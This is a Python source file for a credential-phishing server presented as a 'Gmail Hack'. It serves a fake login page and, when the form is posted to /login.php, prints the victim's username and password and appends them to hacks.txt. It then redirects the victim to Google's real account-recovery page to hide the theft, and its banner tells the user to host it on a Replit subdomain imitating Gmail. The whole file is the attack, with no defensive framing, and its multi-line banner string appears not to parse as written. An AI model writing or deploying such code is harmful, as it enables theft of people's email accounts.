from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import cgi

class RequestHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        # serve the index.html file
        if self.path == '/':
            with open('index.html', 'rb') as f:
                content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
        else:
            self.send_error(404)
            
    def do_POST(self):
        # process the form data
        if self.path == '/login.php':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            post_data = parse_qs(post_data.decode('utf-8'))
            username = post_data.get('username', [''])[0]
            password = post_data.get('password', [''])[0]
            
            # print the results to the terminal
            print('Gmail Username:', username, 'Password:', password)
            
            # save the results to the file
            with open('hacks.txt', 'a') as f:
                f.write(f'Gmail Username: {username} Password: {password}\n')
            
            # redirect to recovery identifier page
            self.send_response(302)
            self.send_header('Location', 'https://accounts.google.com/signin/v2/recoveryidentifier')
            self.end_headers()
        else:
            self.send_error(404)

def run():
    port = 8000
    print(f'  _____                 _ _ 
 / ____|               (_) |
| |  __ _ __ ___   __ _ _| |
| | |_ | '_ ` _ \ / _` | | |
| |__| | | | | | | (_| | | |
 \_____|_| |_| |_|\__,_|_|_|          _    _            _    
| |  | |          | |   
| |__| | __ _  ___| | __
|  __  |/ _` |/ __| |/ /
| |  | | (_| | (__|   < 
|_|  |_|\__,_|\___|_|\_\
                        
                        
  Started At url https://gmail.(your replit name).repl.co/                          ')
    server_address = ('', port)
    httpd = HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    run()
